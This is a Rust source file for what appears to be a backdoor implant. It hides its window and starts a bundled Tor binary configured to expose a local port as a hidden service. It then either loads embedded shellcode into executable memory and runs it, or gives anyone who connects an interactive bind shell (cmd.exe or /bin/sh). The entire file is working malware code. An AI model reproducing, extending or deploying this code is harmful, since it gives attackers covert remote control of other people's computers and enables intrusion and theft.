#![windows_subsystem = "windows"]

mod setting;
mod config;

use std::{io, error, thread, mem, ptr};
use std::fs::File;
use std::path::{PathBuf};
use std::process::{Command, Stdio, Child};
use std::net::{TcpListener, TcpStream};

use memmap::MmapMut;

fn main() -> Result<(), Box<dyn error::Error>> {
    let setting = setting::Setting::new()?;
    
    start_tcp_server(&setting)?;

    Ok(())
}

fn unbundle_torrc(
    path: &PathBuf,
    port: u16,
    setting: &setting::Setting
) -> Result<(), Box<dyn error::Error>> {
    let mut contents = setting.torrc.clone();

    contents = contents.replace(
        "@{DATA_DIR}",
        setting.tor_dir.to_str().unwrap()
    );

    contents = contents.replace(
        "@{CTRL_COOKIE}",
        setting.tor_dir.join("ctrl.cookie").to_str().unwrap()
    );

    contents = contents.replace(
        "@{CTRL_SOCKET}",
        setting.tor_dir.join("ctrl.socket").to_str().unwrap()
    );

    contents = contents.replace(
        "@{SERVICE_ADDR}",
        &format!("127.0.0.1:{}", port)
    );

    std::fs::write(&path, &contents)?;

    Ok(())
}

fn start_tor_binary(
    torrc: &PathBuf,
    setting: &setting::Setting
) -> Result<Child, Box<dyn error::Error>> {
    let mut executable = setting.tor_dir.join(&setting.name);

    if cfg!(windows) {
        executable.set_extension("exe");
    }

    // Fix directory permission - linux build requires this
    if cfg!(unix) || cfg!(macos) {
        let status = Command::new("chmod")
            .args(["700", setting.tor_dir.to_str().unwrap()])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()?;

        if !status.success() {
            return Result::Err(
                String::from("problem setting app directory permision").into()
            );
        }
    }

    let log = setting.tor_dir.join("log.txt");

    let stdout: File = File::create(&log)?;
    let stderr: File = File::create(&log)?;

    let proc = Command::new(executable)
        .args(["-f", torrc.to_str().unwrap()])
        .stdin(Stdio::null())
        .stdout(stdout)
        .stderr(stderr)
        .spawn()?;

    Ok(proc)
}

fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
    let listener = TcpListener::bind("127.0.0.1:0")?;
    let port = listener.local_addr()?.port();
    println!("listening at: {:?}", port);

    let torrc = &setting.tor_dir.join("config");
    unbundle_torrc(&torrc, port, &setting)?;

    let mut tor_proc = start_tor_binary(&torrc, &setting)?;

    if setting.uses_shellcode {
        execute_shellcode(&setting)?;
    } else {
        for stream in listener.incoming() {
            match stream {
                Ok(stream) => {
                    println!("received connection");
                    match bind_shell(stream) {
                        Ok(()) => {},
                        Err(error) => println!("connection error: {:?}", error)
                    };
                },
                Err(error) => return Err(Box::new(error))
            }
        }
    }

    tor_proc.kill()?;

    Ok(())
}

fn pipe_thread<R, W>(mut r: R, mut w: W) -> thread::JoinHandle<()>
where R: io::Read + Send + 'static,
      W: io::Write + Send + 'static
{
    thread::spawn(move || {
        let mut buffer = [0; 1024];
        loop {
            let len = match r.read(&mut buffer) {
                Ok(len) => len,
                Err(_) => break
            };

            if len == 0 {
                break;
            }

            match w.write(&buffer[..len]) {
                Ok(_) => {},
                Err(_) => break
            };

            match w.flush() {
                Ok(_) => {},
                Err(_) => break
            };
        }
    })
}

fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
    let mut args: Vec<&str> = Vec::new();

    let shell;
    if cfg!(windows) {
        shell = "cmd.exe";
    } else {
        shell = "/bin/sh";
        args.push("-i");
    }

    let proc = Command::new(shell)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let stdin = proc.stdin.unwrap();
    let stdout = proc.stdout.unwrap();
    let stderr = proc.stderr.unwrap();

    let stream_in = stream.try_clone()?;
    let stream_out = stream.try_clone()?;
    let stream_err = stream.try_clone()?;

    let in_thread = pipe_thread(stream_in, stdin);
    let out_thread = pipe_thread(stdout, stream_out);
    let err_thread = pipe_thread(stderr, stream_err);

    in_thread.join().unwrap();
    out_thread.join().unwrap();
    err_thread.join().unwrap();

    Ok(())
}

fn execute_shellcode(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
    let len = setting.shellcode.len();

    // writable memory
    let mut w_map = MmapMut::map_anon(len)?;

    unsafe {
        // write shellcode
        ptr::copy(setting.shellcode.as_ptr(), w_map.as_mut_ptr(), len);

        // transition to read and executable memory
        let x_map = w_map.make_exec()?;

        let code: extern "C" fn() -> ! = mem::transmute(x_map.as_ptr());
        code();
    };
}